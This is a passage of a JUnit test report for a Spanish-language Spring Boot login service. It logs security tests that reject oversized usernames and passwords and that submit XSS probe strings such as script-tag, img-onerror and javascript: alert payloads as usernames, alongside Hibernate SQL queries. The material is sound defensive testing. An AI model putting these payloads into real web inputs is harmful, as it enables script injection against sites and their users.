aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]; codes [Size.loginRequest.password,Size.password,Size.java.lang.String,Size]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [loginRequest.password,password]; arguments []; default message [password],255,8]; default message [La contraseña debe tener entre 8 y 255 caracteres]] [Field error in object 'loginRequest' on field 'usuario': rejected value [aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]; codes [Size.loginRequest.usuario,Size.usuario,Size.java.lang.String,Size]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [loginRequest.usuario,usuario]; arguments []; default message [usuario],100,3]; default message [El nombre de usuario debe tener entre 3 y 100 caracteres]] ]
]]></system-out>
  </testcase>
  <testcase name="shouldPreventXssInErrorResponses" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="0.085">
    <system-out><![CDATA[17:10:36.432 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: <script>alert('XSS')</script>
17:10:36.434 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.436 [http-nio-auto-4-exec-8] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: <script>alert('XSS')</script>
17:10:36.436 [http-nio-auto-4-exec-8] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario <script>alert('XSS')</script>: Credenciales inválidas
17:10:36.447 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: <img src=x onerror=alert('XSS')>
17:10:36.448 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.450 [http-nio-auto-4-exec-9] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: <img src=x onerror=alert('XSS')>
17:10:36.450 [http-nio-auto-4-exec-9] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario <img src=x onerror=alert('XSS')>: Credenciales inválidas
17:10:36.459 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: javascript:alert('XSS')
17:10:36.461 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
